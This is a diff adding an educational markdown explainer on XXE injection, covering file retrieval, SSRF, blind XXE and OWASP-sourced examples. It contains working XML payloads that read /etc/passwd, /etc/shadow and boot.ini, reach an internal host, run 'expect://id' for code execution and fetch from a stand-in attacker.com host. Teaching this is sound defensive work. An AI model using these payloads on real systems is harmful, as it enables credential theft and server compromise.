@@ -1,0 +1,153 @@
+## What is an XXE Attack?
+
+XXE (XML External Entity Injection) is a web-based security vulnerability that enables an attacker to
+interfere with the processing of XML data within a web application.
+
+It often enables visibility of the files on the application server file system and interacts with a
+backend or external system that the application itself has access to. In some scenarios, an attacker can
+take an XXE attack a step further by leveraging the XXE attack payload to perform
+SSRF (Server-Side Request Forgery ) in order to compromise the underlying server or other backend infrastructure.
+
+## How do XXE attacks work?
+
+XML is an extremely popular format used by developers to transfer data between the web browser and the server.
+
+XML requires a parser, which is often where vulnerabilities are introduced. XXE enables an entity to be
+defined based on the content of a file path or URL. When the server reads the XML attack payload,
+it parses the external entity, merges it into the final document, and returns it to the user with the
+sensitive data inside.
+
+XXE attacks can also be leveraged by an attacker to perform server-side request forgery (SSRF)
+attacks to compromise the underlying server.
+
+##Types of XXE attacks
+---
+
+>There are several types of XXE attack, namely:
+---
+
+-   Exploiting XXE to retrieve files – When an external entity contains the contents of a file
+    and is returned as an application response.
+
+-   Exploiting XXE to perform SSRF attacks – When an external entity is defined based on a back-end systemURL .
+
+-   Exploiting blind XXE to exfiltrate data out-of-band – When sensitive data is transferred from an
+    application server to an environment that the attacker has control over.
+
+-   Exploiting blind XXE to retrieve data via error messages – When an attacker can trigger a parsing error
+    message that contains sensitive data.
+
+-   Exploiting XXE to retrieve files
+
+When performing an XXE attack that retrieves a random file from the server, modification of the submitted
+XML is required, which can be done in two ways:
+
+-   Adapt or introduce a DOCTYPE element that specifies an external entity containing the file path.
+
+-   Edit the data value in the XML that gets returned in the response from the application, to
+    leverage a specified external entity.
+
+In the example below, let’s suppose an e-commerce sitechecks stock levels of a specific product by
+submitting the following XML:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<stocklevel><ProductID>215</productID></stocklevel>
+```
+
+This particular application performs no specific prevention against XXE, so an attacker can exploit the XXE
+vulnerability to retrieve the /etc/passwd file by submitting an XXE attack payload:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stocklevel><ProductID>&xxe;</ProductID></stocklevel>
+```
+
+The above XXE attack payload defines an external entity &xxe; whose value is the content of
+the /etc/passwd file and uses the entity within the ProductID value. Consequently,
+the response from the application includes the contents of the file:
+
+```
+Invalid Product ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+## Exploiting XXE to perform SSRF attacks
+
+Although retrieving sensitive data is a big concern with XXE, they can also be leveraged to perform
+server-side request forgery (SSRF), making the  server-side application perform HTTP requests to any
+URL that the server has access to.
+
+To do this, an external XML entity needs to be defined using the targeted URL, and then used within a data value.
+Doing this would enable an attacker to read the response from the URL resulting in a two-way interaction
+with the backend.
+
+In the XXE example below, the external entity will force the server to perform a back-end HTTP request
+to an internal system:
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-webapp.com/"> ]>
+
+Blind XXE vulnerabilities & exploitation to retrieve error data messages
+
+Blind XXE instances of XXE attacks are very common, but the application does not return the defined
+external entities in responses, preventing the direct retrieval of server-side files.
+
+To exploit a Blind XXE vulnerability however, an attacker must utilise more complex and advanced methods.
+Out-of-band methods can be used to detect vulnerabilities and exploit them to exfiltrate information,
+or XML parsing errors can be triggered where sensitive data is contained within the error messages.
+
+## XXE Attack Examples
+
+Have a look at the examples below from our friends at OWASP:
+
+> Accessing a local resource that may not return
+
+```
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
+<foo>&xxe;</foo>
+```
+> Remote code execution
+
+If fortune is on our side, and the PHP “expect” module is loaded, we can get RCE. Let’s modify the payload
+
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo
+  [<!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+  <user>`&xxe;`</user>
+  <pass>`mypass`</pass>
+</creds>
+```
+> Disclosing /etc/passwd or other target files
+```<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
+<foo>&xxe;</foo>
+```
